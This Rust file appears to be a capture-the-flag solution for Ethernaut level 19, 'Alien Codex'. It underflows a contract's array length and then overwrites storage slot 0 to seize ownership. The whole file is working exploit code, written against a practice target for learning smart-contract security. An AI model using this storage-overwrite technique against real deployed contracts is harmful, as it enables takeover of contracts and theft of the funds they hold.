//! Ethernaut 19 — Alien Codex.
//!
//! Goal: Make your offender account the owner of `AlienCodex`, a contract with
//! a mutable codex array.
//!
//! https://github.com/OpenZeppelin/ethernaut/blob/d05643a/contracts/src/levels/AlienCodex.sol

use alloy::hex;
use alloy::primitives::{B256, U256, keccak256};
use alloy::providers::Provider;
use async_trait::async_trait;
use ctf::Actor;
use ctf::ethereum::ethernaut::lvl19_alien_codex::*;

pub struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &Actor,
    ) -> eyre::Result<()> {
        println!("offender: {}", offender.address());
        println!("target: {}", target.address);

        let provider = offender.provider();
        let target = AlienCodex::new(target.address, provider.clone());

        let owner = target.owner().call().await?;
        println!("owner before = {owner}");

        target.makeContact().send().await?.watch().await?;

        let array_slot = U256::from(1);

        let slot =
            provider.get_storage_at(*target.address(), array_slot).await?;
        println!(
            "slot #{array_slot}: {}",
            hex::encode_prefixed(slot.to_be_bytes_vec())
        );

        if slot == 0 {
            target.retract().send().await?.watch().await?;

            let slot =
                provider.get_storage_at(*target.address(), array_slot).await?;
            println!(
                "slot #{array_slot}: {}",
                hex::encode_prefixed(slot.to_be_bytes_vec())
            );
        }

        let base = U256::try_from(keccak256(array_slot.to_be_bytes_vec()))?;
        let i = -base;
        let before = target.codex(i).call().await?;
        let payload = B256::left_padding_from(offender.address().as_slice());

        println!("\n\nRevising slot {i} \nfrom: {before} \n  to: {payload}\n");

        target.revise(i, payload).send().await?.watch().await?;

        let owner = target.owner().call().await?;
        println!("owner after = {owner}");

        Ok(())
    }
}
